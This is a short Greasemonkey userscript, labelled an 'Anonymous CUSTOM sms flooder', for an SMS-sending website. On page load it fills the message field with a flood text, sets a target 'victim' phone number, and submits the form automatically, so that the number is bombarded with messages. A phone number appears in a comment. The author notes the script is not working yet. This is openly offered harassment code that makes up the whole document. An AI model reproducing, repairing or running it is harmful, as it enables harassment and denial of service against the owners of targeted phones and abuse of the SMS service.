// ==UserScript==
// @name          Anonymous CUSTOM sms flooder
// @namespace     Yash
// @description   flooder sms
// @include       http://*sms.urbuddy.com/*
// ==/UserScript==


//NOT WORKING YET, WILL EDIT IT SOON




var victim=0; //+919633087782
var msg="FLOODING CHALU HAI"; // aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
// ********   130 letters maximun   **********


if(document.location=="http://sms.urbuddy.com/")
{
document.getElementsByTagName("textarea")[0].value=msg;
document.getElementsByTagName("input")[3].value=victim;
document.forms[1].submit();void(0);
}